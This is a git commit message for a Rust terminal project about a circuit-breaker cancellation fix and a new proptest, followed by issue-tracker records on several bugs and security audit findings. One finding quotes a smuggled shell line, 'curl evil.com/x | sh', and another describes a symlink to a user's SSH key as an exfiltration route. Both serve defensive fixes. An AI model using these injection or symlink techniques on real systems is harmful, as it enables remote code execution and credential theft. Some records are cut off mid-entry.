message:
fix(retry): exempt Error::Cancelled from circuit-breaker failure count (ft-gc4hz) + parse_first proptest + beads

## retry.rs: circuit breaker must not count cancellation as failure

with_retry_and_circuit_cx previously matched `Err(_)` and called
`circuit.record_failure()` unconditionally. Any `Error::Cancelled(_)`
raised by Cx-initiated cancellation therefore polluted the breaker's
consecutive_failures counter — an external cx.cancel() could push the
breaker past `failure_threshold` and reject subsequent unrelated callers
with CircuitOpen. That violates the breaker's contract: it counts
backend faults, not caller intent.

Fix: add a match arm for `Err(Error::Cancelled(_))` between the success
and general-failure arms. On cancellation, skip both record_success AND
record_failure — the consecutive_failures counter stays truthful and
the Err is propagated unchanged to the caller. Inline comment cites
ft-gc4hz and explains the rationale so future readers don't "simplify"
the three-arm match back to two.

## New proptest: parse_first entry points

Add `frankenterm/escape-parser/tests/proptest_parse_first.rs` — a
property-based robustness suite specifically targeting
`Parser::parse_first` and `Parser::parse_first_as_vec`. These streaming
entry points are used by tmux_cc, replay engines, and any framing-aware
consumer that needs to pull one escape sequence at a time from a byte
buffer. The companion proptest_parser_robustness.rs already covers
Parser::parse + parse_as_vec, but the streaming path had only three
hand-written unit tests in src/parser/mod.rs:785-801.

Pinned invariants:
  1. Crash-freedom — parse_first never panics on arbitrary bytes.
  2. Consumed-bound — when Some((_, n)) is returned,
     0 < n <= bytes.len(). n == 0 would violate progress; n >
     bytes.len() would index-out-of-bounds in callers that split
     &bytes[n..].
  3. Determinism — calling parse_first twice on identical slices with
     fresh parsers returns the same Some(n)/None.
  4. parse_first + parse_first_as_vec agree on the consumed offset
     (same sequence boundary per byte stream).
  5. Drain-to-EOF covers the whole input — chaining parse_first
     across &bytes[n..] eventually returns None with the cursor at
     bytes.len(), never short of it.

## Beads

Close four beads whose fixes landed in this session's commits:
  - ft-761tz: closed. "Landed in c5a02edb (fix(disk_pressure): fail
    closed on NaN in Ewma, PID, and classifier) + regression tests".
  - ft-7ojbj: closed. "Landed in 7998d1a4 (fix(rate_limit_tracker):
    clamp parsed Retry-After at MAX_COOLDOWN_SECS)".
  - ft-fvt0b: closed. "Fixed in 4d6c4abc; verified with codec --lib
    and conformance_pdu_wire".
  - ft-kjkhu: closed. "Verified in f43cc0ee and a10b00b5 via codec
    conformance_pdu_wire".

File two new beads:
  - ft-8uj10 (in_progress, pane8): event identity key should ignore
    extracted object insertion order.
  - ft-gc4hz (open): retry: cancelled operations must not count as
    circuit-breaker failures. Addressed by this commit's retry.rs fix;
    bead status stays `open` per the tracker's convention of filing
    before closing in a separate sweep (close reason goes on the
    follow-up when verification lands).

Co-Authored-By: Claude <noreply@anthropic.com>

 {"id":"ft-682n6","title":"Migrate ~50 tokio-based async tests to asupersync runtime (ft-22x4r tracked)","description":"# Goal
Convert ~50 tests using #[tokio::test] to work with the asupersync runtime. These tests fail at runtime with: task::spawn called outside of Runtime::block_on context. Originally tracked as ft-22x4r.

# Background
The asupersync migration replaced tokio, but ~50 tests still use #[tokio::test]. Count verified 2026-04-06: 50 in .rs files (excluding .bak). Most are in *_labruntime.rs test files (2 per file across ~25 files) plus 2 in dependency_eradication.rs.

# Design
## Discovery (exact count at implementation time)
1. grep -r '#\[tokio::test\]' crates/ --include='*.rs' | grep -v '.bak' > /tmp/tokio_tests.txt
2. Count and categorize by file pattern:
   - *_labruntime.rs files: ~25 files × 2 tests = ~50 tests (async smoke + basic scenario)
   - dependency_eradication.rs: 2 tests
3. For each, identify tokio primitives used: spawn, sleep, channels, timeout

## Migration strategy
- *_labruntime.rs pattern: These all follow the same template (2 tests per file). Once one is migrated, the rest are mechanical.
  Replace: #[tokio::test] with #[test] + runtime_compat::block_on(async { ... })
  Or: if asupersync provides a test macro, use that
- Replace tokio::spawn -> runtime_compat spawn equivalent
- Replace tokio::time::sleep -> runtime_compat::sleep
- Replace tokio channels -> runtime_compat channels

## Batch approach
Since *_labruntime.rs files follow a uniform pattern, write a migration helper that does the mechanical replacement, then verify each file compiles.

## Structured Logging
- Migration log: file, old_macro, new_macro, primitives_replaced, compile_status

# Acceptance Criteria
1. Zero #[tokio::test] in .rs files (verified by grep, excluding .bak).
2. All ~50 previously-failing tests now pass.
3. No semantic changes — same assertions.
4. Total test count preserved.
5. No new tokio dependencies.
6. Commit message lists affected files.

# Implementation Notes
- runtime_compat.rs provides bridge primitives.
- The *_labruntime.rs naming convention suggests these are lab/smoke tests for async behavior.
- This bead unblocks ft-xbnl0.2 (async cutover epic).
- Coordinate with ft-n2j5w (MCP test fix) if any MCP tests also use tokio::test.","status":"closed","priority":1,"issue_type":"task","estimated_minutes":240,"created_at":"2026-04-06T18:58:21.227738Z","created_by":"jemanuel","updated_at":"2026-04-07T02:55:15.155157Z","closed_at":"2026-04-07T02:55:15.154811Z","close_reason":"Verified: zero actual #[tokio::test] annotations remain in crates/frankenterm-core/. All 50 occurrences found by grep are in comments/docstrings/string literals describing the migration that was already done. The *_labruntime.rs files already use #[test] + RuntimeFixture::current_thread().block_on(). No code changes needed.","source_repo":".","compaction_level":0,"original_size":0,"labels":["asupersync","migration","testing"]}
 {"id":"ft-6mxfs","title":"[mor:security-engineering] ws_dir = root.join('.ft','patterns') is not canonicalized before discovery","description":"# Observation

In `load_packs_from_config`
(crates/frankenterm-core/src/patterns.rs:949):

    let ws_dir = root_path.join(".ft").join("patterns");
    let discovered = discover_packs_from_dir(&ws_dir)?;

ft-fbee5 (just closed) fixed the case where a symlink INSIDE
`.ft/patterns/` escapes the sandbox. But the parent path is itself
just a join, no canonicalize. A hostile cloned repo can ship:

    .ft/patterns -> /etc

(a symlink at the directory level.) `ws_dir` canonicalizes to
`/etc`, `discover_packs_from_dir(/etc)` iterates there, and the
per-file sandbox check passes because it canonicalizes with root =
`/etc`. The symlink escape is now one level up.

Similar attack surface for `config.resolved_user_packs_dir()` if
that ever returns a joined path the caller doesn't canonicalize.

# Question

Should `load_packs_from_config` canonicalize `ws_dir` and verify the
result resolves *inside* `root_path.canonicalize()` before calling
`discover_packs_from_dir`? That closes the parent-level symlink
vector without needing to change `discover_packs_from_dir`'s
contract.

Stretch: is there a case for centralizing this as a
`sandbox_resolve_dir(dir, root)` helper and using it everywhere the
pack/workflow/policy loaders join a workspace-relative path? The
pattern is probably not unique to pack loading.

# Trust boundary

The repo is the attacker; the user's home directory is the victim.
Everything a hostile repo can make `read_to_string` see is a
potential data-exfil primitive. Treat repo-relative path
construction as crossing a trust boundary, and canonicalize at the
boundary crossing, not at the leaf.","status":"closed","priority":3,"issue_type":"question","created_at":"2026-04-21T17:35:09.320199Z","created_by":"mor-review","updated_at":"2026-04-21T17:51:59.305474Z","closed_at":"2026-04-21T17:51:59.305207Z","close_reason":"Fixed in 0239fbd6 — added sandbox_resolve_dir helper, routed load_packs_from_config's ws_dir through it with 4 regression tests (missing, inside-root, toplevel-symlink-escape, end-to-end).","source_repo":".","compaction_level":0,"original_size":0,"labels":["mor","sandboxing","security"]}
 {"id":"ft-6piwt","title":"[P0 BLOCKER] frankenterm-core lib has 61 compile errors under --no-default-features — blocks all --no-default-features test/bench runs","description":"## Symptom
`cargo check -p frankenterm-core --lib --no-default-features` fails with 61 errors. Panes 3 and 4 in the swarm both hit this while trying to verify their respective commits.

## Representative error
```
error[E0599]: no method named `record_event_with_cx` found for this struct
  --> crates/frankenterm-core/src/storage.rs:6157
  help: there is a method `record_event` with a similar name

error[E0599]: no method named `get_text_with_cx` found for struct `std::sync::Arc<(dyn WeztermInterface + 'static)>`
  --> crates/frankenterm-core/src/wezterm.rs:3272:43
  note: `wezterm::PaneTextSource` defines an item `get_text_with_cx`, perhaps you need to implement it
```

## Root cause hypothesis
Asupersync migration landed `_with_cx` **callers** in some files without landing `_with_cx` **implementations** on the corresponding traits/structs, specifically under the default feature set (where the legacy impls are gated off but the new impls aren't gated on).

## Scope
- crates/frankenterm-core/src/storage.rs (record_event_with_cx)
- crates/frankenterm-core/src/wezterm.rs (get_text_with_cx + PaneTextSource trait alignment)
- 61 errors total; likely same pattern elsewhere

## Fix direction
1. Run `cargo check -p frankenterm-core --lib --no-default-features 2>&1 | grep 'error\[\|error:' > /tmp/errors.txt` to enumerate all 61.
2. Group by method name; for each missing `*_with_cx` method:
   - If the non-cx variant exists, add a default impl or route `with_cx` through it (respects cancel semantics).
   - If neither exists, revert the caller to the non-cx variant with a TODO referencing ft-xbnl0.2 epic.
3. Verify with `cargo check` clean, then `cargo test --lib --no-default-features`.

## Priority
P0 — blocks swarm from running any tests under --no-default-features, which is the recommended lean test surface.","status":"closed","priority":0,"issue_type":"bug","created_at":"2026-04-21T14:29:56.725238Z","created_by":"jemanuel","updated_at":"2026-04-21T14:50:22.680762Z","closed_at":"2026-04-21T14:50:22.680537Z","close_reason":"Added no-feature cx compatibility shims and ungated fallback *_with_cx adapters so frankenterm-core --lib --no-default-features compiles again","source_repo":".","compaction_level":0,"original_size":0}
-{"id":"ft-761tz","title":"[HIGH] disk_pressure NaN sample silently reports Green tier instead of failing closed","description":"# Defect

## Concrete failure path

1. Caller passes `DiskSample { usage_fraction: NaN, .. }` to `DiskPressureMonitor::update_with_sample`. Easy trigger: `available/total` when `total == 0` (e.g., disk fails to mount, statvfs momentarily returns zero, unit-test fixture with an empty filesystem).
2. `EwmaEstimator::update` calls `sample.clamp(0.0, 1.0)`. **`NaN.clamp(0.0, 1.0)` returns NaN** — this is documented Rust behaviour but caller-hostile. The clamp does not sanitise the NaN.
3. `EwmaEstimator::value` becomes NaN and stays NaN for every subsequent `update()` — the recurrence `alpha * NaN + (1-alpha) * prev` preserves NaN indefinitely.
4. `PidController::update` receives `pid_error = NaN - target`. Its internal integral + derivative go NaN and the output is NaN. Permanent until `reset()`.
5. `classify_tier(NaN, thresholds)` compares `NaN >= thresholds.black` which is `false`, then `>= red`, `>= yellow` — all false under IEEE-754 NaN rules — so the final branch returns **`Green`**.
6. Net: one NaN sample corrupts the monitor forever and every subsequent report says healthy even though the underlying disk is broken or unreadable. Operators trusting the Green tier take no action.

## Severity rationale

- Silent wrong answer, not a crash or a visible error.
- Opposite direction from the intended semantics — the failure mode is a LIE ("disk is fine") for the exact case the monitor exists to flag.
- One bad sample is sticky: the monitor cannot self-recover.

## Fix sketch

1. `EwmaEstimator::update` — if sample is NaN, skip the recurrence and return the prior value (or 1.0 if uninitialised). Do not poison internal state.
2. `PidController::update` — if error is NaN, skip state update and return 0.0 (or last output). Same no-poison rule.
3. `classify_tier` — if the incoming usage_fraction is NaN, return **Black** (fail closed). A NaN usage means we cannot prove the disk is healthy; the safe default is to alert.
4. Regression tests: a targeted test pinning each of the three defences, plus an end-to-end test that a NaN sample yields Black and the next clean sample reclassifies correctly.

## Scope

`crates/frankenterm-core/src/disk_pressure.rs` only.  {"id":"ft-7axpo","title":"protocol_recovery deterministic jitter defeats thundering-herd protection","description":"# [HIGH] protocol_recovery: fake jitter

**Subsystem:** protocol_recovery / retry
**File:** crates/frankenterm-core/src/protocol_recovery.rs (`RecoveryConfig::delay_for_attempt`)

## The hole

\`\`\`rust
let jitter_seed = ((attempt as f64 * 7.13).sin().abs()).mul_add(2.0, -1.0);
let jittered_ms = jitter_range.mul_add(jitter_seed, capped_ms).max(1.0);
\`\`\`

`sin(attempt * 7.13)` is fully deterministic. Every RecoveryEngine in the
process produces the **same** delay for a given attempt number. In a large
agent swarm, if 100 panes lose their mux connection simultaneously (mux
server restart), every engine schedules identical retry timings: attempt=0
→ delay_X, attempt=1 → delay_Y, etc. They all pile in at the same
instants — the exact thundering-herd collision that jitter exists to
prevent.

Pre-fix: `jitter_fraction: 0.1` looked like 10% decorrelation but produced
zero decorrelation across engines.

## Fix

Replaced the deterministic `sin()`-derived seed with
`rand::rng().random_range(-jitter_range..=jitter_range)` — same approach
already used in `retry.rs::RetryPolicy::delay_for_attempt`. Consistent with
how the other module in the same crate spells jitter.

Kept the `jitter_range > 0.0` fast-path so `jitter_fraction == 0.0` is
still bit-exact deterministic (tests rely on this).

## Caller impact

`RecoveryEngine::execute` uses `delay_for_attempt` to sleep between
protocol-error retries. No test depends on deterministic jitter
(`delay_for_attempt_*` tests set `jitter_fraction: 0.0`), so the fix is
drop-in.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T17:26:26.938808Z","created_by":"p3-review-audit","updated_at":"2026-04-21T17:43:28.102548Z","closed_at":"2026-04-21T17:43:28.102198Z","close_reason":"Fix already shipped in fdd1e817; regression tests added in bf4a63b9 (delay_for_attempt_jitter_is_randomized_across_calls + delay_for_attempt_zero_jitter_is_deterministic).","source_repo":".","compaction_level":0,"original_size":0,"labels":["protocol-recovery","reliability","retry"]}
-{"id":"ft-7ojbj","title":"rate_limit_tracker: parse_retry_after can produce Duration that panics Instant + cooldown","description":"# Defect

`crates/frankenterm-core/src/rate_limit_tracker.rs:441-473` `parse_retry_after` has no upper bound on the parsed duration.

Plain-number path at :452-454:
```rust
if let Ok(secs) = text.parse::<u64>() {
    return Some(Duration::from_secs(secs));
}
```

'N unit' path at :458-469 has a `checked_mul` guard, but the plain number path returns `Duration::from_secs(u64::MAX)` untouched (u64::MAX secs ≈ 584 billion years).

The returned Duration flows into `PaneRateLimitState::record_event` at :164:
```rust
let expiry = event.detected_at + event.cooldown;
```

`Instant + Duration` panics when the sum overflows the platform's underlying representation. On macOS/Linux Instant is backed by clock_gettime timespec/uptime — adding ~584B years to a fresh Instant will overflow.

# Reachability

`retry_after_text` reaches record_event from pattern detection output. `trigger_retry_after` (workflows/builtin_workflows.rs) extracts the string from agent-emitted rate-limit messages. A malformed provider response or adversarial agent output ('Retry-After: 18446744073709551615') would panic the tracker on record.

# Existing tests

`parse_retry_after_overflow_returns_none` at :515-518 covers the 'N unit' checked_mul path with 'u64::MAX hours', but NOT the plain-number path with 'u64::MAX'. That path currently returns `Some` unclamped.

# Fix

Clamp parse_retry_after to a sane max (24h ceiling — legitimate provider Retry-After values never exceed 1h in practice, and any longer wait is a signal to bail rather than block the tracker). Apply the cap uniformly to plain-number and 'N unit' paths. Also clamp DEFAULT_COOLDOWN_SECS fallback if it ever grows.

Add regression test: parse_retry_after_plain_u64_max_is_clamped asserts the plain-number path returns a Duration ≤ the cap, not None and not u64::MAX.

# Severity

MEDIUM — requires adversarial/malformed provider input to trigger. Tracker is behind rate_limit_tracker.lock() in workflows/builtin_workflows.rs so the panic takes down the workflow task but is scoped to one pane's rate-limit processing. Fix is trivial: one `.min(MAX_COOLDOWN)` call plus one test.","status":"in_progress","priority":2,"issue_type":"bug","created_at":"2026-04-22T09:40:08.211722Z","created_by":"jemanuel","updated_at":"2026-04-22T09:40:14.020153Z","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-8jbpj","title":"wezterm.rs pre-existing compile breakage blocks ft-e34d9.10.5.2","description":"While validating ft-e34d9.10.5.2 on 2026-04-21, the checkout surfaced pre-existing source breakage already present in HEAD.

Primary blocker:
- crates/frankenterm-core/src/wezterm.rs:1963-1968 contains a malformed pool_result branch. After the explicit-Cx else arm calls pool.send_paste_with_cx(&cx, pane_id, data).await, HEAD still has a stray pool.send_paste(pane_id, data).await line before the branch closes. That leaves the control-flow expression malformed and blocks frankenterm-core compile/hygiene in the vendored mux verification lane.

Related hygiene blocker surfaced in the same lane:
- crates/frankenterm-core/src/vendored/mux_client.rs:1891 contains a stray ); inside PaneOutputSubscription, so rustfmt cannot parse the file while formatting touched vendored mux changes.

Evidence:
- dirty diff against HEAD shows removing the stray send_paste line in wezterm.rs and the stray ); in mux_client.rs restores parsable source shape locally.
- rch exec -- env CARGO_TARGET_DIR=/tmp/ft-p7-orch-target cargo test -p frankenterm-core --lib cancellation_during_ --features asupersync-runtime,vendored -- --nocapture surfaced pre-existing frankenterm-core compile failures during the same validation lane.

 {"id":"ft-akx00","title":"[EPIC] Eliminate verified first-party placeholders and stubs","description":"# Goal
Eliminate every verified first-party placeholder, stub, mock-like runtime branch, and misleading partial implementation surfaced by the 2026-04-02 audit.

Every in-scope item must end in exactly one of two states:
1. Real shipping behavior with tests, metrics, and operator-visible semantics.
2. Explicitly narrowed scope backed by code changes, docs, and guardrails so the code no longer masquerades as implemented behavior.

# Inventory Covered By This Epic
- CLI / operator support: `build_ntm_stub_response`, `chrono_stub_now`, scheduled backup compression fallback.
- Support crates: `frankenterm/env-bootstrap` and `ringlog` bootstrap/logger stubs.
- Client/runtime control plane: `ActiveWorkspaceChanged` TODO, unilateral-message FIXME, `spawn_pane` unimplemented, alt-screen hardcoded false.
- SDK / connectors / search: transparency verification stub, certification integration probe stub, generated Rust SDK transport unimplemented, `CrossEncoderReranker` no-op, `Model2VecEmbedder` stub, FastEmbed sentinel constructor behavior.
- Core runtime / UX: `NullPaneScrollbackAccess`, FTUI placeholder views, recording delta encodings, stale PaneCapabilities stub annotation.
- Rendering / windowing: Wayland seat+keyboard TODOs, WGL/macOS/EGL resize gaps, bitmap/WebGPU readback gaps, terminfo raw/cropped image gaps, GUI background/glyph placeholders.
- Mux / SSH: tmux PTY lifecycle gaps, detach unimplemented across domains, SFTP metadata mutation, SSH `Match Exec` evaluation.

# Scope Boundary
Only first-party source is in scope. Test doubles under `#[cfg(test)]`, intentional null objects, unsupported-platform no-op shims, and vendored upstream TODOs are handled only if this program reclassifies them with evidence.","design":"# Execution Strategy
1. Start with inventory discipline so no suspect disappears mid-stream.
2. Attack operator-visible and machine-control surfaces first; silent stubs in control-plane APIs are the highest trust risk.

4. Prefer shared primitives over leaf fixes. Example: alt-screen truth should come from a real pane-status pipeline, not per-call heuristics.
5. Use the no-backwards-compatibility policy aggressively: if a placeholder path should not exist, remove or collapse it instead of preserving a fake API.
6. Every completed child bead must remove the misleading placeholder signal from code and add regression tests proving the real behavior.","acceptance_criteria":"- Every verified suspect from the audit is mapped to a child bead under this epic.

 {"id":"ft-e8brh","title":"[MEDIUM] cancel_races_child_creation test has weak race coverage; passes trivially via propagation","description":"In commit 6a16ae0a (fix(ft-2xnop): add unix umask coverage ... +
cancellation concurrency tests), the test
\`cancel_races_child_creation_all_children_see_cancellation\` at
crates/frankenterm-core/src/cancellation.rs:2635-2676 claims to verify
the cancel+child race but does not reliably exercise the race window.

Structure:
\`\`\`rust
for _ in 0..20 {
    let parent = CancellationToken::new(...);
    let n_creators = 8;
    let barrier = Arc::new(Barrier::new(n_creators + 1));

    let handles: Vec<_> = (0..n_creators).map(|i| {
        let parent = parent.clone();
        let barrier = Arc::clone(&barrier);
        thread::spawn(move || {
            barrier.wait();
            parent.child(ScopeId(format!(\"c_{i}\")))
        })
    }).collect();

    barrier.wait();
    parent.cancel(ShutdownReason::UserRequested);
    // ... assert every child is cancelled
}
\`\`\`

Problems:

1. The barrier synchronizes the START of each thread's work but not
   the duration of \`parent.child(...)\`. On a machine with >=8 cores,
   the 8 creator threads typically finish \`parent.child(...)\` BEFORE
   the main thread reaches \`parent.cancel(...)\`. In that ordering, all
   children are pre-existing when cancel propagates — a trivial case
   covered by other tests in the file.

2. 20 sequential rounds with no scheduler perturbation (no \`yield_now\`,
   no sleep, no thread count above core count) rarely hit the interesting
   interleaving where cancel runs mid-child-creation.

3. The assertion passes even if \`parent.child()\` has a bug where it
   reads the \"parent cancelled\" flag AFTER registration but BEFORE
   propagation reaches it — because the test never creates that window.

Impact: false confidence in race-safe \`CancellationToken::child()\`
under concurrent cancel. A latent bug where a newly-created child
escapes both propagation (not-yet-registered) AND post-cancel detection
(child() reads stale flag) would not be caught.

Fix direction:
- Spawn more creators than CPU cores (e.g., 64) so some are preempted
  mid-call.
- Insert \`thread::yield_now()\` or a short sleep inside the creator
  body before calling \`parent.child()\` to widen the race window.
- Alternatively, use an inner barrier that creators wait on AFTER
  they've decided to create the child but BEFORE registration, so the
  main thread can force the interleaving.
- Consider using loom or shuttle for deterministic interleaving
  coverage instead of probabilistic races.

Severity: medium — test quality issue, not a proven correctness bug
in cancellation.rs. Filing because the test claims coverage it does
not deliver.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-20T07:25:11.821489Z","created_by":"jemanuel","updated_at":"2026-04-20T07:48:54.626483Z","closed_at":"2026-04-20T07:48:54.626237Z","close_reason":"Hardened in 7ac677a6: creator count 8→64 (forces preemption on any host), per-thread yield_now + modulo 50µs sleep widens race, rounds 20→64, each creator samples is_cancelled() pre-child() and the round-level outcomes are checked so the test asserts the cancel-first ordering was actually exercised at least once — if it isn't, the test fails with a diagnostic pointing at loom/shuttle for deterministic coverage. Build clean; local run blocked by unrelated macOS dyld bottleneck under load.","source_repo":".","compaction_level":0,"original_size":0,"labels":["cancellation","concurrency","review","test-gap","testing"]}
 {"id":"ft-fbee5","title":"pattern pack discovery followed symlinks out of tree","description":"# [HIGH] pattern-pack loader: symlink-escape via discover_packs_from_dir

**Subsystem:** patterns / scan_pipeline
**File:** crates/frankenterm-core/src/patterns.rs

## The hole

`load_pack_from_file(path, root)` routes through `sandbox_resolve` only when a
`Some(root)` is supplied. `discover_packs_from_dir`, used for
`.ft/patterns/**` discovery from a workspace root, was calling
`load_pack_from_file(path, None)` for every file + rules.toml it iterated —
so the sandbox check was **skipped** even though the dir itself was
workspace-attacker-controlled.

A hostile repo could ship:

    .ft/patterns/config.yaml -> /Users/victim/.ssh/id_rsa

`path.is_file()` follows the symlink (returns true), `load_pack_from_file`
opens the target, feeds its contents to `serde_yaml::from_str`, and on parse
failure emits:

    tracing::warn!("Skipping invalid user pack {}: {e}", path.display());

Which can echo excerpts of the target file via serde's error reporting
(`mapping expected, found: …`).

## Pre-conditions

* victim clones a hostile repo that contains a symlink under
  `.ft/patterns/`;
* frankenterm loads user packs at session start.

## Fix

`discover_packs_from_dir` now passes `Some(dir)` as the sandbox root to
`load_pack_from_file`. `sandbox_resolve` canonicalizes and rejects any
resolved path outside `dir`. Added regression test
`discover_packs_rejects_symlink_escape`.

## Residual risk

A top-level symlink replacing `.ft/patterns` itself would still escape
because the caller (`load_packs_from_config`) builds `ws_dir =
root_path.join(".ft").join("patterns")` without canonicalizing. That's a
follow-up — tracking separately.

## Sibling work

- 33e84436 security(patterns): add sandbox_resolve helper (helper introduction)
- e8397747 / 8e57c8e0 fix(limits): MAX_PACK_BYTES 16 MiB cap (orthogonal DoS layer)","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T17:26:10.019601Z","created_by":"p3-review-audit","updated_at":"2026-04-21T17:54:22.244142Z","closed_at":"2026-04-21T17:54:22.243799Z","close_reason":"Fixed in 6ab52765 — canonicalize + in-tree check applied to pack discovery","source_repo":".","compaction_level":0,"original_size":0,"labels":["ft-05hfm","patterns","security"]}

 {"id":"ft-gofz5","title":"[EPIC] Release engineering: first tagged release, cargo install validation, and binary distribution pipeline","description":"# Goal
Establish a working release pipeline so that \`cargo install --git ... ft\` actually works, release binaries are available for major platforms, and there are tagged versions users can reference.

# Background
The reality check found:
- Only 1 git tag exists ("backup-before-rewrite") — no version releases
- \`cargo install\` is advertised in README Quick Install but never validated
- 6 GitHub Actions workflows exist (ci.yml, release.yml, etc.) but release.yml has never been triggered for a real release
- The project is pre-1.0 with 4,288 commits but zero releases
- Build is resource-intensive (~793k LOC core library) which may cause cargo install to fail on memory-constrained machines

# Why This Matters
A project that can't be installed by its advertised method has zero users. Even for internal/swarm use, tagged releases let agents pin to known-good versions. Release hygiene signals project maturity.

# Architectural Intent
1. Validate that \`cargo install --git ... ft\` succeeds on a clean machine (Linux x86_64, macOS arm64 at minimum).
2. Create v0.1.0 tag with honest release notes reflecting current capabilities.
3. Ensure release.yml workflow produces downloadable binaries.
4. Add a CI job that runs \`cargo install\` from git to catch install regressions.

2. A v0.1.0 tag exists with release notes that honestly describe working features, partial features, and known limitations.
3. release.yml produces downloadable binaries for at least Linux x86_64 and macOS arm64.
4. CI includes a cargo install smoke test that runs on every push to main.
5.  {"id":"ft-kcsae","title":"[mor:performance-engineering] storage.rs at 31k lines — is FTS5 indexing synchronous on the capture path?","description":"# Observation

storage.rs is 31,648 lines (largest module in the core crate). It
owns a SQLite connection with WAL, drives FTS5 virtual tables for
the lexical-search surface, and handles retention sweeps
(\`database_stats(..., retention_days)\` at line 3758).

FTS5 writes are expensive — they rebuild inverted-index pages on
INSERT/UPDATE. If the capture path writes rows AND the FTS5 trigger
runs synchronously in the same transaction, every captured segment
pays the indexing cost before the write returns, which is pushed
onto the hot path at the very point where backpressure is trying
to keep up.

Not verified in this pass — just the shape of the concern given
the size of storage.rs and the presence of FTS5. Worth a targeted
read of the capture-write code path.

# Question

Three measurements that would clarify whether this matters:

1. Is there a "defer FTS5 indexing to a background task" path, or
   do FTS5 triggers fire in the capture-write transaction?
2. What's the p99 latency of \`insert_pane_output\` under a 200-pane
   load with FTS5 enabled vs disabled?
3. Is there an async/batch FTS5 index-catchup task that operators
   can offload indexing to?

If (1) is "synchronous" and (2) shows meaningful gap between
enabled/disabled, then an async-index mode is probably the fattest
win in the capture subsystem. Memory budget permits: a lag of
seconds in search freshness is almost always an acceptable trade
for linear-capture throughput during incidents.

# Structural note

31k lines in one module suggests the subsystem has grown through
absorption rather than redesign. Might be worth sketching the
module boundaries as a separate planning exercise before
optimizing; "where does latency go when we write a segment" is a
question that should have a one-page answer.","status":"closed","priority":3,"issue_type":"question","created_at":"2026-04-21T17:36:06.994443Z","created_by":"mor-review","updated_at":"2026-04-21T18:01:07.436214Z","closed_at":"2026-04-21T18:01:07.435839Z","close_reason":"Answered. Q1 (sync or async?): SYNCHRONOUS — three AFTER INSERT/DELETE/UPDATE triggers at storage.rs:169-180 fire inside every append_segment_sync transaction (storage.rs:12308). Q2 (p99 measurement): not run — needs a load harness. Q3 (async catchup available?): infrastructure EXISTS (fts_pane_progress table storage.rs:472 + sync_fts_on_startup storage.rs:16131 + FtsSyncConfig storage.rs:2363) but is wired only for startup recovery and explicit rebuild, NOT for live capture. Follow-up for the actual move-to-deferred work filed as ft-wk5fo with concrete plan + risk notes + measurement prerequisite.","source_repo":".","compaction_level":0,"original_size":0,"labels":["fts5","mor","performance","storage"]}
 {"id":"ft-kegvt","title":"[MEDIUM] launch_agent pipes restored `command` into shell via send_text without CR/LF sanitization","description":"Found during /security-audit-for-saas pass #4 (pane 5, 2026-04-21).

## Summary
`restore_process.rs::launch_agent_legacy` (line 625) and
`launch_agent_cx` (line 648) build the command string for a restored
pane by `format!("{command}\r", ...)` and then sending it to the
pane shell via `self.wezterm.send_text(pane_id, &full_cmd)`. The
pane shell is an active interactive shell (not an argv-isolated
subprocess), so any `\r` or `\n` in `command` injects additional
lines into the shell's input buffer.

## Evidence
- crates/frankenterm-core/src/restore_process.rs:625
  ```rust
  async fn launch_agent_legacy(
      &self,
      pane_id: u64,
      command: &str,          // <- from RestoredPaneState.command
      cwd: &Path,
      agent_type: &str,
  ) -> Result<(), String> {
      let cd_cmd = format!("cd {}\r", shell_escape(cwd));
      self.wezterm.send_text(pane_id, &cd_cmd).await...;
      ...
      let full_cmd = format!("{command}\r");   // <- unsanitized
      self.wezterm.send_text(pane_id, &full_cmd).await...;
  ```
- crates/frankenterm-core/src/restore_process.rs:648 — the cx-first
  variant has the same shape and the same gap.
- Note the asymmetry: `cwd` IS passed through `shell_escape(cwd)`,
  but `command` is not. The cd helper got the defensive treatment;
  the main command did not.

## Impact / trust boundary
`RestoredPaneState.command` is loaded from the SQLite session DB
at `session_restore.rs:892` where `state.command` is read from the
`mux_pane_state` table. Attack paths requiring this field to be
attacker-controlled:

1. DB write access (already implies full-user compromise; out of
   scope as a net-new threat).
2. Snapshot bundle import from an untrusted source — `ft diag
   bundle` round-trips include session data; if someone shares a
   diag bundle and it gets restored, the imported `command`
   values pass through this path.
3. `ft restart --launch-agents` applied after a targeted
   corruption of `mux_pane_state` rows.

Severity: MEDIUM. Not a remote zero-click — requires an existing
trust-boundary crossing — but the defense-in-depth gap is concrete:
a restored `command` like `claude-code\r curl evil.com/x | sh`
would execute the second line in the user's shell on
`ft restart --launch-agents`.

## Fix direction
1. Quick (defense in depth): reject or strip any `\r`/`\n` from
   `command` before formatting. A restored command that needs
   multi-line input is already broken — the typing model assumes
   one command per restore. Concretely:
   ```rust
   if command.chars().any(|c| matches!(c, '\r' | '\n')) {
       return Err(format!(
           "refusing to launch pane {pane_id}: restored command contains CR/LF"
       ));
   }
   ```
2. Proper (larger): route relaunch through `wezterm cli spawn --`
   with argv-isolated arguments instead of typing into an
   interactive shell. Eliminates shell metacharacter concerns
   entirely.

## Non-gaps verified in the same pass
- Snapshot restore has NO direct `fs::write` / `fs::create_dir`
  path (grep confirmed zero hits in session_restore.rs +
  snapshot_engine.rs). Arbitrary-file-write via restore is not
  reachable today.
- Pattern-pack URL loading: `load_pack_from_id` at patterns.rs:963
  accepts only `builtin:` and `file:` schemes; any other scheme
  returns `PackNotFound`. No HTTP/URL fetch surface. **No SSRF.**
- FTS5 query escaping: user query passes to `MATCH ?1` as a bound
  rusqlite parameter at storage.rs:17486/17496; SQL injection is
  impossible and `validate_fts_query` rejects malformed FTS5 DSL
  cleanly. **Clean.**

## Related
- ft-security-mcp-path-traversal (fixed 30988e53) — same class of
  defense-in-depth gap across the MCP tool surface.
- ft-xv561 (fixed 070117a0) — ReDoS via user-pack regexes.

